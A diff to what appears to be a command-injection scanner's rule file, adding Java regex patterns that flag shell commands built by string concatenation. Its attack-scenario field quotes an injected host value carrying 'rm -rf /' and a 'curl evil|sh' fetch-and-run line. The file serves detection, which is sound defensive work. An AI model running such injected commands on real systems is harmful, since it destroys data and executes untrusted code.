@@ -28,6 +28,16 @@
       "lang": "java",
       "confidence": "high",
       "re": "\\.command\\s*\\(\\s*\"[^\"]*\"\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "[\"'](?:-c|/c)[\"']\\s*,\\s*[\"'][^\"']*[\"']\\s*\\+"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "(?:\\.exec|new\\s+ProcessBuilder|\\.command)\\s*\\(\\s*(?:new\\s+String\\[\\]\\s*\\{[^}]*\\+|String\\.format\\()"
     }
   ],
   "attack_scenario": "Attacker supplies host = example.com; rm -rf / (or `curl evil|sh`); the concatenated command line executes the injected commands with the app's privileges.",
